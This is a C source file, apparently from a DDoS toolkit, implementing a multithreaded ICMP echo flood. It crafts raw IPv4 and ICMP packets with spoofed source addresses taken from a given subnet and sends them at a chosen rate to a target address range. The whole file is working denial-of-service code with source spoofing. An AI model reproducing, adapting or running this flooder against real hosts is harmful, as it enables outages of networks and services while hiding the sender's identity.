#include "header.h"
#include "base/make_ipv4.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/icmp_flood.h"

// session counting
__u64 g_icmp_num_total;
__u64 g_icmp_num_generated_in_sec;
// from main()
unsigned char g_icmp_src_ip[16] = { 0, };
unsigned char g_icmp_dest_ip[16] = { 0, };
__u32 g_icmp_src_mask;
__u32 g_icmp_dest_mask;
__u32 g_icmp_dest_port_start;
__u32 g_icmp_dest_port_end;
__u32 g_icmp_request_per_sec;
// for masking next ip address
unsigned char g_icmp_now_src_ip[16] = { 0, };
unsigned char g_icmp_now_dest_ip[16] = { 0, };
__u32 g_icmp_now_port;
// thread
pthread_mutex_t g_icmp_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_icmp_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_icmp_before_time;
struct timespec g_icmp_now_time;

void icmp_flood_print_usage(void)
{
	printf("ICMP flood Usage : "
			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_icmp_flood(void *data)
{
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_ICMP);
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_icmp_mutex);
		// get now resource
		generator(
				g_icmp_src_ip,
				g_icmp_dest_ip,
				g_icmp_src_mask,
				g_icmp_dest_mask,
				g_icmp_dest_port_start,
				g_icmp_dest_port_end,
				g_icmp_now_src_ip,
				g_icmp_now_dest_ip,
				&g_icmp_now_port);
		// make ipv4 header
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_ICMP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_icmp_now_src_ip));
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_icmp_now_dest_ip));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct icmp));
		// make icmp header
		struct icmp *icmp_h_ptr;
		char buf[sizeof(struct icmp)];
		memset(buf, 0x00, sizeof(struct icmp));
		icmp_h_ptr = (struct icmp*) buf;
		icmp_h_ptr->icmp_type = ICMP_ECHO;
		icmp_h_ptr->icmp_code = 0;
		icmp_h_ptr->icmp_cksum = 0;
		icmp_h_ptr->icmp_seq = htons(g_icmp_num_total);
		icmp_h_ptr->icmp_id = getpid();
		icmp_h_ptr->icmp_cksum = in_cksum(
				(u_short *) icmp_h_ptr,
				sizeof(struct icmp));
		// wait a second
		if (g_icmp_num_generated_in_sec >= g_icmp_request_per_sec) {
			pthread_cond_wait(&g_icmp_cond, &g_icmp_mutex);
		}
		// time checking
		time_check(
				&g_icmp_cond,
				&g_icmp_before_time,
				&g_icmp_now_time,
				&g_icmp_num_generated_in_sec);
		// make and send packet
		char *packet = packet_assemble(ipv4_h, icmp_h_ptr, sizeof(struct icmp));
		send_packet(sock, ipv4_h, packet, g_icmp_now_port);
		free(packet);
		g_icmp_num_generated_in_sec++;
		g_icmp_num_total++;
		// printf("%lu icmp sent\n", g_icmp_num_generated_in_sec);
		// *** end of critical section ***
		pthread_mutex_unlock(&g_icmp_mutex);
	}
	close(sock);
	return NULL;
}

void *icmp_flood_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_icmp_mutex);
		time_check(
				&g_icmp_cond,
				&g_icmp_before_time,
				&g_icmp_now_time,
				&g_icmp_num_generated_in_sec);
		pthread_mutex_unlock(&g_icmp_mutex);
	}
	return NULL;
}

void icmp_flood_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		icmp_flood_print_usage();
		return;
	}
	// get ip address, mask, port
	split_ip_mask_port(
			argv,
			g_icmp_src_ip,
			g_icmp_dest_ip,
			&g_icmp_src_mask,
			&g_icmp_dest_mask,
			&g_icmp_dest_port_start,
			&g_icmp_dest_port_end);
	g_icmp_num_generated_in_sec = 0;
	g_icmp_num_total = 0;
	memset(&g_icmp_before_time, 0, sizeof(struct timespec));
	memset(&g_icmp_now_time, 0, sizeof(struct timespec));
	g_icmp_request_per_sec = atoi(argv[3]);
	int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Sending ICMP requests to %s using %d threads %u per sec\n",
			g_icmp_dest_ip,
			num_threads,
			g_icmp_request_per_sec);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(
				&threads[i],
				NULL,
				generate_icmp_flood,
				(void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, icmp_flood_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("thread %d joined\n", i);
	}
	pthread_mutex_destroy(&g_icmp_mutex);
	printf("ICMP flood Finished\nTotal %lu packets sent.\n", g_icmp_num_total);
	pthread_exit(NULL);
	return;
}
